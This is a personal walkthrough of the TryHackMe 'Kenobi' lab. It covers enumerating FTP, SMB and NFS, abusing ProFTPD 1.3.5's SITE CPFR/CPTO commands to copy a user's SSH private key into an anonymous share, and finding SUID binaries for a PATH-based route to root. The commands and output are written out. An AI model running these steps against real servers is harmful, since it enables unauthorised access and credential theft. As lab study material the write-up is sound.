### HTTP (80)
	
Looks like port 80 is opened on the machine, but it's only displaying an image: 
	
	![[Pasted image 20211008135024.png]]
	
**Gobuster** could not find any new directories.
	
### FTP (21)
	
	The FTP server looks particularly interesting.
	This ProFTPD server version (1.3.5) seems to be vulnerable to the following exploit, as 
	described on [[Rapid7]]:
	
*This module exploits the SITE CPFR/CPTO commands in ProFTPD version 1.3.5. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination. The copy commands are executed with the rights of the ProFTPD service, which by default runs under the privileges of the 'nobody' user. By using /proc/self/cmdline to copy a PHP payload to the website directory, PHP remote code execution is made possible.*
	
	[https://www.rapid7.com/db/modules/exploit/unix/ftp/proftpd_modcopy_exec/]
	
	Let's try enumerating the SMB shares/users with *enum4linux*.
	
	Looks like there might be an anonymous share: 
	
	![[Pasted image 20211008143648.png]]
	
	We have also found the following domains: 
	
	![[Pasted image 20211008143717.png]]
	
	Since there is an **anonymous** share on SMB, we can try and login without a password.
	
	We can do so by using the following command: 
*	smbclient //10.10.203.182/anonymous*
	
	Inside the anonymous share, we found a txt file 'log.txt'
	
	The file shows us that the proftpd server is running as 'kenobi' user.
	
	We can see that on the port 111 (rpc)
	showmount -e 10.10.52.227
	Export list for 10.10.52.227:
	/var *
	
	
ProFTPD version seems to be 1.3.5.:
*nmap -sC -sV $IP -p 21                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-10 02:45 EDT
Nmap scan report for 10.10.2.255
Host is up (0.062s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5
Service Info: OS: Unix*

	We can try to connect to the server and move kenobi's id_rsa to the anonymous samba share (which we have access to without any credentials)
*nc $IP 21                                                                                
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.2.255]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful*
exit
	
Now we can try to mount the var file with nfs, like this: 
	
*mount 10.10.2.255:/var /mnt/nfs/kenobiNFS*
	

(rootðŸ’€kali)-[/mnt/nfs/kenobiNFS/tmp]
â””â”€# ls                                                                                         127 â¨¯ 1 âš™
id_rsa

Now that we have kenobi's id_rsa key, we can try to log into ssh using it.
	
	![[Pasted image 20211010035001.png]]
	
	And here is our user txt:
	
	![[Pasted image 20211010035113.png]]
	
	
Now, we shall try to escalate our privilegies to root.
	
As described on Tryhackme, we can use that by abusing SUID:
	
**SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues. **

**To search the a system for these type of files run the following:**  *find / -perm -u=s -type f 2>/dev/null*

By searching for this, we have found some files.
	
The usr/bin/menu seems interesting, and if we run it, we can see the following: 
	
	![[Pasted image 20211010141323.png]]
	
We can use the "strings" command for those binaries.
*Strings is a command on Linux that looks for human readable strings on a binary.*
	
![[Pasted image 20211010141632.png]]
	
Tryhackme: *This shows us the binary is running without a full path (e.g. not using /usr/bin/curl or /usr/bin/uname).

As this file runs as the root users privileges, we can manipulate our path gain a root shell.*
